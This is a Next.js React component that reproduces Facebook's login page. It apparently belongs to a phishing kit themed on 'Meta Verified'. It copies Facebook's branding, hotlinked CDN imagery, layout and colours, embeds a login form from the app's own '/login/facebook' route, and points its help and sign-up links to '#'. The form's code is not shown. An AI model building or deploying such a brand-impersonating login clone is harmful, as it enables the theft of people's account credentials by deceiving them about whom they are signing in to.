'use client'

import Image from 'next/image'
import Link from 'next/link'

import { FbLoginForm } from '@/app/login/facebook/FbLoginForm'
import PrivacyLanguagePicker from '@/components/meta-verified/PrivacyLanguagePicker'
import { useAppStrings } from '@/hooks/useAppStrings'

const FB_COLLAGE_WEBP =
  'https://static.xx.fbcdn.net/rsrc.php/yB/r/83zWJdc6PJI.webp'

const TEXT_DARK = '#1c1e21'

const fbFont =
  'system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI Historic", "Segoe UI", Roboto, Helvetica, Arial, sans-serif'

function FbGlyph({ className }: { className?: string }) {
  return (
    <svg
      viewBox="0 0 24 24"
      fill="currentColor"
      width="1em"
      height="1em"
      className={className}
      aria-hidden
    >
      <path d="M22 12.037C22 6.494 17.523 2 12 2S2 6.494 2 12.037c0 4.707 3.229 8.656 7.584 9.741v-6.674H7.522v-3.067h2.062v-1.322c0-3.416 1.54-5 4.882-5 .634 0 1.727.125 2.174.25v2.78a12.807 12.807 0 0 0-1.155-.037c-1.64 0-2.273.623-2.273 2.244v1.085h3.266l-.56 3.067h-2.706V22C18.164 21.4 22 17.168 22 12.037z" />
    </svg>
  )
}

export default function FacebookLoginClient() {
  const t = useAppStrings()
  const p = t.fbLoginPage

  return (
    <div
      className="min-h-[100dvh] bg-white antialiased [-webkit-font-smoothing:antialiased]"
      style={{ fontFamily: fbFont, color: TEXT_DARK }}
    >
      <div className="mx-auto flex min-h-[100dvh] max-w-[1920px] flex-col lg:min-h-screen lg:flex-row">
        <section className="hidden min-h-screen w-full flex-col bg-white lg:flex lg:flex-[0_0_58%] lg:justify-between lg:px-[clamp(2.5rem,4vw,4.25rem)] lg:pb-[clamp(1.75rem,3vh,3rem)] lg:pt-[clamp(2rem,3.5vw,3rem)] xl:pl-[4.75rem] xl:pr-14">
          <header className="shrink-0">
            <span className="sr-only">{p.brandSrOnly}</span>
            <span
              aria-hidden="true"
              className="inline-block translate-y-px leading-none text-[#1877F2] [--fb-f-size:clamp(2.5rem,5.25vw,3.125rem)] [font-size:var(--fb-f-size)]"
            >
              <FbGlyph className="block" />
            </span>
          </header>

          <div className="relative flex min-h-0 w-full flex-1 flex-col justify-center pb-6 pt-4 lg:my-0 lg:px-0 lg:py-4">
            <div className="relative mx-auto h-[min(74vh,880px)] w-full max-w-[min(800px,calc(100%-1rem))] shrink-0 xl:max-w-[min(860px,95%)]">
              <Image
                src={FB_COLLAGE_WEBP}
                alt=""
                fill
                sizes="(max-width: 1024px) 92vw, min(860px, 60vw)"
                className="object-contain object-center"
                priority
              />
            </div>
          </div>

          <footer className="relative z-[1] shrink-0 pb-2 pt-8 lg:pb-2 lg:pt-10">
            <p
              className="text-left font-bold tracking-[-0.04em] text-[#1c1e21] lg:whitespace-nowrap"
              style={{
                fontSize: 'clamp(1.9375rem, 1vw + 1.45rem, 2.9375rem)',
                lineHeight: 1.1,
              }}
            >
              {p.sloganBefore}
              <span className="text-[#1877F2]">
                {p.sloganAccent}
                <span className="text-[#1c1e21]">.</span>
              </span>
            </p>
          </footer>
        </section>

        <div
          className="hidden w-px shrink-0 self-stretch bg-[#dadde1] lg:block"
          aria-hidden
        />

        <aside className="flex w-full flex-1 flex-col bg-white lg:min-h-screen lg:max-w-none lg:min-w-0 lg:flex-[0_0_42%]">
          <div className="mx-auto flex min-h-[100dvh] w-full max-w-[396px] flex-col justify-between px-6 pb-10 pt-[42px] sm:px-8 lg:max-h-none lg:min-h-screen lg:justify-between lg:px-12 lg:pb-12 lg:pt-14 xl:px-14">
            <div className="flex flex-col lg:flex-1 lg:justify-center lg:pt-4">
              <div className="mb-11 flex justify-center lg:hidden">
                <Image
                  src="/images/meta/logo.svg"
                  alt={p.mobileLogoAlt}
                  width={60}
                  height={60}
                  className="size-[60px] select-none"
                  priority
                />
              </div>

              <h1
                className="hidden text-center font-bold tracking-[-0.015em] text-[#1c1e21] lg:block"
                style={{
                  fontSize: '1.25rem',
                  lineHeight: 'calc(1.25 * 1.3)',
                }}
              >
                {p.heading}
              </h1>

              <FbLoginForm />

              <nav className="mt-3 text-center" aria-label={p.accountHelpNav}>
                <Link
                  href="#"
                  className="inline-block text-[17px] font-normal leading-snug hover:underline max-lg:text-[#1c1e21] lg:text-[15px] lg:text-[#1877F2]"
                >
                  {p.forgottenPassword}
                </Link>
              </nav>
            </div>

            <div className="mx-auto mb-6 w-full max-w-[240px] lg:hidden">
              <PrivacyLanguagePicker />
            </div>

            <div className="flex flex-col gap-8 pb-2 pt-6 lg:mt-8 lg:flex lg:shrink-0 lg:gap-0 lg:pb-12 lg:pt-0">
              <Link
                href="#"
                className="flex h-11 w-full shrink-0 items-center justify-center rounded-[10px] border border-solid border-[#1877F2] bg-white text-[17px] font-semibold leading-tight text-[#1877F2] transition-colors hover:bg-[#F5F6F7] lg:rounded-md lg:border-0 lg:bg-[#42b72a] lg:text-white lg:hover:bg-[#36a420] lg:active:bg-[#2b9217]"
              >
                {p.createAccount}
              </Link>

              <div className="mx-auto hidden w-full max-w-[240px] lg:flex">
                <PrivacyLanguagePicker />
              </div>

              <div className="flex justify-center lg:mt-10">
                <Image
                  src="/images/meta/logo-meta.svg"
                  alt={p.metaLogoAlt}
                  width={132}
                  height={26}
                  className="h-[26px] w-auto max-w-[min(100%,148px)] object-contain object-center opacity-[0.98]"
                />
              </div>
            </div>
          </div>
        </aside>
      </div>
    </div>
  )
}
